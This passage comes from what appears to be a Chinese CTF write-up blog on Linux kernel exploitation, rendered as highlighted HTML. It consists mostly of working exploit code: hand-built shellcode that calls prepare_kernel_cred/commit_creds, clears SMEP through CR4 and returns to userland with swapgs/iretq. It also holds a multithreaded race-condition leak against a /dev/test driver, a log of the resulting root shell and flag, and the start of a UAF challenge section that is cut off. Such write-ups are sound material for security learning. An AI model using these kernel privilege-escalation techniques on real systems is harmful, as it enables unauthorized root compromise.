class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = <span class="number">0x90ff3148</span>;</span><br><span class="line">    tmp += <span class="number">3</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xb848</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = prepare_kernel_cred;</span><br><span class="line">    tmp += <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xd0ff</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = <span class="number">0x90c78948</span>;</span><br><span class="line">    tmp += <span class="number">3</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xb848</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = commit_creds;</span><br><span class="line">    tmp += <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xd0ff</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span> *)tmp = <span class="number">0xf0c7c748</span>; <span class="comment">//mov rdi,0x6f0;</span></span><br><span class="line">    tmp += <span class="number">4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)tmp = <span class="number">0x06</span>;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0x0</span>;</span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0x220f</span>;  <span class="comment">//mov cr4,rdi;</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0xe7</span>;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x6a</span>;     <span class="comment">//push user_ss</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)user_ss;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span> *)tmp = <span class="number">0xB848</span>; <span class="comment">//push user_rsp</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">long</span> *)tmp = user_rsp;</span><br><span class="line">    tmp += <span class="number">8</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)tmp = <span class="string">'P'</span>; </span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x68</span>;     <span class="comment">//push rflags</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)user_rflags;</span><br><span class="line">    tmp += <span class="number">4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x6a</span>;     <span class="comment">//push user_cs</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">char</span>)user_cs;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0x68</span>;     <span class="comment">//push get_shell</span></span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">int</span>*)tmp = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)get_shell;</span><br><span class="line">    tmp += <span class="number">4</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0x010f</span>; <span class="comment">//swapgs;</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)tmp = <span class="number">0xf8</span>;</span><br><span class="line">    tmp += <span class="number">1</span>;</span><br><span class="line">    *(<span class="keyword">unsigned</span> <span class="keyword">short</span>*)tmp = <span class="number">0xcf48</span>; <span class="comment">//iretq;</span></span><br><span class="line">    tmp += <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    ret_addr[<span class="number">0x300</span>/<span class="number">8</span>+<span class="number">12</span>] = slub + <span class="number">0x400</span>;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)ret_addr+<span class="number">0x400</span>,shellcode,<span class="number">0x100</span>);</span><br><span class="line">    ioctl(pts,<span class="number">0x2333</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"[:(]final...."</span>);</span><br><span class="line">    getchar();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2020/02/20/kp7IAKgEZyMqXv1.png" alt="x1.PNG"></p>
<h2 id="再次反思："><a href="#再次反思：" class="headerlink" title="再次反思："></a>再次反思：</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">./exp</span><br><span class="line">0x1234000 = 0xffffa18e8442dc00</span><br><span class="line">[   39.672314] general protection fault: 0000 [<span class="comment">#1] SMP PTI</span></span><br><span class="line">[   39.673411] CPU: 0 PID: 1096 Comm: exp Tainted: G           O      5.0.0-rc8+ <span class="comment">#2</span></span><br><span class="line">[   39.673662] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014</span><br><span class="line">[   39.674586] RIP: 0010:__kmalloc+0x8d/0x1a0</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">[   39.682351] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span><br><span class="line">[   39.682456] CR2: 00007ffe6ddfcfb0 CR3: 0000000004484000 CR4: 00000000003006f0</span><br><span class="line">~ $ $ id</span><br><span class="line">id</span><br><span class="line">uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)</span><br><span class="line">~ $ $ <span class="built_in">exit</span></span><br><span class="line"><span class="built_in">exit</span></span><br><span class="line">umount: can<span class="string">'t unmount /dev: Device or resource busy</span></span><br><span class="line"><span class="string">[   46.133945] sd 0:0:0:0: [sda] Synchronizing SCSI cache</span></span><br><span class="line"><span class="string">[   46.135758] sd 0:0:0:0: [sda] Stopping disk</span></span><br><span class="line"><span class="string">[   46.139729] general protection fault: 0000 [#2] SMP PTI</span></span><br><span class="line"><span class="string">[   46.139867] CPU: 0 PID: 1102 Comm: poweroff Tainted: G      D    O      5.0.0-rc8+ #2</span></span><br><span class="line"><span class="string">[   46.140011] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014</span></span><br><span class="line"><span class="string">[   46.140215] RIP: 0010:kmem_cache_alloc_trace+0x6e/0x160</span></span><br><span class="line"><span class="string">[   46.140349] Code: 00 00 00 4d 8b 07 65 49 8b 50 08 65 4c 03 05 f1 ee 65 71 49 8b 28 48 85 ed 0f 84 ae 00 00 00 41 8b 47 20 49 8b 3f 48 8d 4a 01 &lt;48&gt; 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 74 c5 41 8b</span></span><br><span class="line"><span class="string">[   46.140750] RSP: 0018:ffffa845800dfb18 EFLAGS: 00000206</span></span><br><span class="line"><span class="string">[   46.140865] RAX: 0000000000000000 RBX: ffffa18e84b8f0c0 RCX: 0000000000000a2f</span></span><br><span class="line"><span class="string">[   46.141008] RDX: 0000000000000a2e RSI: 00000000006080c0 RDI: 0000000000023cc0</span></span><br><span class="line"><span class="string">[   46.141151] RBP: 4141414141414141 R08: ffffa18e87823cc0 R09: 0000000000000000</span></span><br><span class="line"><span class="string">[   46.141300] R10: ffffa18e854d7690 R11: 000000000000005f R12: 00000000006080c0</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">[   46.163526] R10: ffffa845800e7d40 R11: 000000000000b702 R12: 00000000006080c0</span></span><br><span class="line"><span class="string">[   46.163739] R13: 0000000000000385 R14: ffffa18e85401500 R15: ffffffffc02f8064</span></span><br><span class="line"><span class="string">[   46.163873] FS:  000000000201a880(0000) GS:ffffa18e87800000(0000) knlGS:0000000000000000</span></span><br><span class="line"><span class="string">[   46.164019] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span></span><br><span class="line"><span class="string">[   46.164126] CR2: 00000000004af430 CR3: 0000000004490000 CR4: 00000000003006f0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Please press Enter to activate this console. $</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">/ # $ id</span></span><br><span class="line"><span class="string">id</span></span><br><span class="line"><span class="string">uid=0(root) gid=0(root)</span></span><br><span class="line"><span class="string">/ # $ ls</span></span><br><span class="line"><span class="string">ls</span></span><br><span class="line"><span class="string">bin      etc      home     linuxrc  sbin     tmp</span></span><br><span class="line"><span class="string">dev      flag     lib      proc     sys      usr</span></span><br><span class="line"><span class="string">/ # $ cat flag</span></span><br><span class="line"><span class="string">cat flag</span></span><br><span class="line"><span class="string">[   57.514984] general protection fault: 0000 [#4] SMP PTI</span></span><br><span class="line"><span class="string">[   57.515146] CPU: 0 PID: 1110 Comm: cat Tainted: G      D    O      5.0.0-rc8+ #2</span></span><br><span class="line"><span class="string">[   57.515284] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS Ubuntu-1.8.2-1ubuntu1 04/01/2014</span></span><br><span class="line"><span class="string">[   57.515482] RIP: 0010:__kmalloc+0x8d/0x1a0</span></span><br><span class="line"><span class="string">[   57.515633] Code: 01 00 00 4d 8b 06 65 49 8b 50 08 65 4c 03 05 d2 e4 65 71 49 8b 28 48 85 ed 0f 84 cf 00 00 00 41 8b 46 20 49 8b 3e 48 8d 4a 01 &lt;48&gt; 8b 5c 05 00 48 89 e8 65 48 0f c7 0f 0f 94 c0 84 c0 74 c5 41 8b</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">...</span></span><br><span class="line"><span class="string">[   57.524166] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033</span></span><br><span class="line"><span class="string">[   57.524274] CR2: 00007ffef6c32a28 CR3: 0000000004460000 CR4: 00000000003006f0</span></span><br><span class="line"><span class="string">Segmentation fault</span></span><br><span class="line"><span class="string">/ # $ source ./flag</span></span><br><span class="line"><span class="string">source ./flag</span></span><br><span class="line"><span class="string">-/bin/sh: ./flag: line 1: de1ctf&#123;RaCE_C0nd1ti0n_For_FUN&#125;: not found</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> tmp;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST_READ 0x23333</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST_WRITE 0x23334</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TEST_DEL 0x23335</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">command</span>&#123;</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> size;</span><br><span class="line">  <span class="keyword">char</span>* context;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_r</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">long</span> size ,<span class="keyword">char</span>* context)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">command</span> <span class="title">command</span>;</span></span><br><span class="line">  command.size = size;</span><br><span class="line">  command.context = context;</span><br><span class="line">  ioctl(fd, TEST_READ, &amp;command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_w</span><span class="params">(<span class="keyword">int</span> fd ,<span class="keyword">unsigned</span> <span class="keyword">long</span> size ,<span class="keyword">char</span>* context)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">command</span> <span class="title">command</span>;</span></span><br><span class="line">  command.size = size;</span><br><span class="line">  command.context = context;</span><br><span class="line">  ioctl(fd, TEST_WRITE, &amp;command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test_d</span><span class="params">(<span class="keyword">int</span> fd)</span></span>&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">command</span> <span class="title">command</span>;</span></span><br><span class="line">  ioctl(fd, TEST_DEL, &amp;command);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *addr1;</span><br><span class="line"><span class="keyword">char</span> *addr2;</span><br><span class="line"><span class="keyword">char</span> *addr3;</span><br><span class="line"><span class="keyword">int</span> fd;</span><br><span class="line"><span class="keyword">int</span> fd2;</span><br><span class="line">fuck = <span class="number">0x300</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">child</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x280</span>;i++)&#123;</span><br><span class="line">    fuck++;</span><br><span class="line">    test_r(fd,fuck,addr2);</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">child2</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x280</span>;i++)&#123;</span><br><span class="line">    fuck++;</span><br><span class="line">    test_r(fd,fuck,addr2);</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">child3</span><span class="params">(<span class="keyword">void</span> *arg)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x380</span>;i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(fuck&gt;<span class="number">0x400</span>)&#123;</span><br><span class="line">      fuck = <span class="number">0x300</span>;</span><br><span class="line">      test_d(fd);</span><br><span class="line">    &#125;</span><br><span class="line">    fuck++;</span><br><span class="line">    test_r(fd,fuck,addr2);</span><br><span class="line">  &#125;</span><br><span class="line">  pthread_exit(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">  addr1 = (<span class="keyword">void</span>*)mmap((<span class="keyword">void</span>*)<span class="number">0x1234000</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">  addr2 = (<span class="keyword">void</span>*)mmap((<span class="keyword">void</span>*)<span class="number">0x1235000</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">  addr3 = (<span class="keyword">void</span>*)mmap((<span class="keyword">void</span>*)<span class="number">0x1236000</span>,<span class="number">0x1000</span>,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED,<span class="number">-1</span>,<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *test1;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *test2;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> *test3;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> pgd_addr=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> page_offset_base=<span class="number">0</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">long</span> now_buffer=<span class="number">0</span>;</span><br><span class="line">  fd = open(<span class="string">"/dev/test"</span>,O_RDONLY);</span><br><span class="line">  fd2 = open(<span class="string">"/dev/test"</span>,O_RDONLY);</span><br><span class="line">  <span class="built_in">memset</span>(addr1,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">  <span class="built_in">memset</span>(addr2,<span class="number">0x41</span>,<span class="number">0x1000</span>);</span><br><span class="line">  <span class="built_in">memset</span>(addr3,<span class="number">0</span>,<span class="number">0x1000</span>);</span><br><span class="line">  <span class="keyword">int</span> check = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> success_index = <span class="number">0</span>;</span><br><span class="line">  test1 = addr1;</span><br><span class="line">  test2 = addr2;</span><br><span class="line">  test3 = addr3;</span><br><span class="line">  <span class="keyword">pthread_t</span> t1,t2,t3;</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    pthread_create(&amp;t1, <span class="literal">NULL</span>, child, <span class="string">"Child"</span>);</span><br><span class="line">    pthread_create(&amp;t2, <span class="literal">NULL</span>, child2, <span class="string">"Child"</span>);</span><br><span class="line">    pthread_create(&amp;t3, <span class="literal">NULL</span>, child3, <span class="string">"Child"</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x400</span>;i++)&#123;</span><br><span class="line">      test_w(fd,<span class="number">0x300</span>,addr1);</span><br><span class="line">      <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;=<span class="number">0x100</span>;j++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(*(test1+j) != <span class="number">0x4141414141414141</span> &amp;&amp; *(test1+j))&#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">"%p = %p\n"</span>,test1+j,*(test1+j));</span><br><span class="line">          success_index = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span>(success_index)&#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pthread_join(t1,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t2,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(t3,<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">if</span>(success_index)&#123;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="2019KCTF-T11：绝地反击"><a href="#2019KCTF-T11：绝地反击" class="headerlink" title="2019KCTF_T11：绝地反击"></a>2019KCTF_T11：绝地反击</h1><h2 id="思路：-2"><a href="#思路：-2" class="headerlink" title="思路："></a>思路：</h2><p>这题我做完都不知道他逻辑是什么意思。。。一顿操作猛如虎，给了八个选项，理清楚以后就是一个<code>UAF</code>。。。我透。</p>
<p>不过<code>5.2.0</code>的<code>kernel</code>还是有不少小坑的。请自己尝试解决吧。</p>
<h2 id="exp：-20"><a href="#exp：-20" class="headerlink" title="exp："></a>exp：</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/prctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> 